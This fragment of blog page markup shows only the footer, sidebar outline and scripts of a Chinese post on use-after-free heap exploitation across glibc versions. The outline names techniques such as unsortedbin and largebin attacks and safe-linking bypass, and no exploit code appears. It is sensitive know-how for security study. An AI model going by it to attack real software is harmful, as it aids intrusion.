title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/19/%E5%90%84%E7%89%88%E6%9C%ACUAF%E4%B8%93%E5%9C%BA/">http://pig-007.github.io/2021/08/19/%E5%90%84%E7%89%88%E6%9C%ACUAF%E4%B8%93%E5%9C%BA/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/Heap/">Heap</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/19/2.metasploit-%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90/"><span class="paginator-prev__text">2.metasploit-部分命令执行获取权限</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%B0%83%E8%AF%95%E8%84%9A%E6%9C%AC"><span class="toc-text">
+          一、题目及调试脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">
+          二、环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE"><span class="toc-text">
+          项目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81Glibc2-23"><span class="toc-text">
+          三、Glibc2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-UAF-Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-text">
+          1.UAF + Leak + Size不做限制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-UAF-Leak-size%E9%99%90%E5%88%B6"><span class="toc-text">
+          2.UAF + Leak + size限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-UAF-%E6%97%A0Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6"><span class="toc-text">
+          3.UAF + 无Leak + Size不做限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-UAF-%E6%97%A0Leak-Size%E5%81%9A%E9%99%90%E5%88%B6"><span class="toc-text">
+          4.UAF + 无Leak + Size做限制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Glibc2-27"><span class="toc-text">
+          四、Glibc2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-27Tcache%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%9A"><span class="toc-text">
+          2.27Tcache题外话：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Key%E5%AD%97%E6%AE%B5%E6%96%B0%E5%A2%9E%EF%BC%9A"><span class="toc-text">
+          (1)Key字段新增：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Tcache%E6%95%B0%E9%87%8F%E9%99%90%E5%88%B6"><span class="toc-text">
+          (2)Tcache数量限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81Glibc2-29"><span class="toc-text">
+          五、Glibc2.29</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%83%A8%E5%88%86%E6%89%8B%E6%AE%B5%E5%A4%B1%E6%95%88"><span class="toc-text">
+          1.部分手段失效</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-unsortedbin-attack%E5%A4%B1%E6%95%88"><span class="toc-text">
+          (1)unsortedbin attack失效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-top-chunk%E6%94%B9%E5%86%99%E9%99%90%E5%88%B6"><span class="toc-text">
+          (2)top_chunk改写限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-unlink%E6%96%B9%E9%9D%A2%E4%B8%80%E4%BA%9B%E9%99%90%E5%88%B6"><span class="toc-text">
+          (3)unlink方面一些限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-tcache%E6%96%B9%E9%9D%A2%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-text">
+          (4)tcache方面的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E6%96%B0%E5%A2%9Ekey%E5%AD%97%E6%AE%B5"><span class="toc-text">
+          ①新增key字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%96%B0%E5%A2%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%A3%80%E6%9F%A5"><span class="toc-text">
+          ②新增的一些检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%87%BA%E7%8E%B0%E7%9A%84%E6%96%B0%E6%89%8B%E6%AE%B5"><span class="toc-text">
+          ③出现的新手段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-UAF%E5%B8%B8%E8%A7%81%E9%99%90%E5%88%B6"><span class="toc-text">
+          2.UAF常见限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-UAF-Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6%EF%BC%9A-1"><span class="toc-text">
+          (1)UAF + Leak + Size不做限制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-UAF-Leak-Size%E5%81%9A%E9%99%90%E5%88%B6"><span class="toc-text">
+          (2)UAF+Leak+Size做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-UAF-%E6%97%A0Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6-1"><span class="toc-text">
+          (3)UAF+无Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-UAF-%E6%97%A0Leak-Size%E5%81%9A%E9%99%90%E5%88%B6-1"><span class="toc-text">
+          (4)UAF+无Leak+Size做限制:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81Glibc2-31"><span class="toc-text">
+          六、Glibc2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%83%A8%E5%88%86%E6%89%8B%E6%AE%B5%E5%A4%B1%E6%95%88-1"><span class="toc-text">
+          1.部分手段失效</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E5%A7%8Blargebin-attack%E5%A4%B1%E6%95%88"><span class="toc-text">
+          (1)原始largebin attack失效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Tcache%E7%BB%93%E6%9E%84%E6%89%A9%E5%A4%A7"><span class="toc-text">
+          (2)Tcache结构扩大</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A0%E9%99%A4%E4%BA%86%E4%B8%80%E4%BA%9Bassert"><span class="toc-text">
+          (3)删除了一些assert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-UAF%E5%B8%B8%E8%A7%81%E9%99%90%E5%88%B6-1"><span class="toc-text">
+          2.UAF常见限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-UAF-Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6"><span class="toc-text">
+          (1)UAF+Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-UAF-Leak-Size%E5%81%9A%E9%99%90%E5%88%B6-1"><span class="toc-text">
+          (2)UAF+Leak+Size做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-UAF-%E6%97%A0Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6-2"><span class="toc-text">
+          (3)UAF+无Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-UAF-%E6%97%A0Leak-Size%E5%81%9A%E9%99%90%E5%88%B6-2"><span class="toc-text">
+          (4)UAF+无Leak+Size做限制:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81Glibc2-32"><span class="toc-text">
+          七、Glibc2.32</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%96%B0%E5%A2%9E%E6%9C%BA%E5%88%B6"><span class="toc-text">
+          1.新增机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Tcache%E5%92%8CFastbin%E6%96%B0%E5%A2%9E%E6%8C%87%E9%92%88%E5%BC%82%E6%88%96%E6%A3%80%E6%9F%A5%E7%9A%84safe-linking%E6%9C%BA%E5%88%B6"><span class="toc-text">
+          (1)Tcache和Fastbin新增指针异或检查的safe-linking机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%BC%95%E5%85%A5%E4%B8%80%E4%B8%AA%E5%AE%8F%E5%AE%9A%E4%B9%89"><span class="toc-text">
+          ①引入一个宏定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8"><span class="toc-text">
+          ②实际应用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Tcache%E4%B8%AD"><span class="toc-text">
+          Tcache中</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fastbin%E4%B8%AD"><span class="toc-text">
+          Fastbin中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%B0%E5%A2%9E%E6%9C%BA%E5%88%B6Safe-linking%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-text">
+          (2)新增机制Safe-linking的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%A7%84%E5%BE%8B%E6%80%A7"><span class="toc-text">
+          ①规律性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%89%B9%E6%AE%8A%E6%80%A7"><span class="toc-text">
+          ②特殊性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%B0%E5%A2%9ETcache%E5%9C%B0%E5%9D%80%E5%AF%B9%E9%BD%90%E6%A3%80%E6%9F%A5"><span class="toc-text">
+          (3)新增Tcache地址对齐检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-UAF%E5%B8%B8%E8%A7%81%E9%99%90%E5%88%B6-2"><span class="toc-text">
+          2.UAF常见限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-UAF-Leak-Size%E4%B8%8D%E5%81%9A%E9%99%90%E5%88%B6-1"><span class="toc-text">
+          (1)UAF+Leak+Size不做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-UAF-Leak-Size%E5%81%9A%E9%99%90%E5%88%B6-2"><span class="toc-text">
+          (2)UAF+Leak+Size做限制:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-UAF-%E6%97%A0Leak-Size%E5%81%9A%E9%99%90%E5%88%B6"><span class="toc-text">
+          (3)UAF+无Leak+Size做限制:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
+          总结</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.json';
 
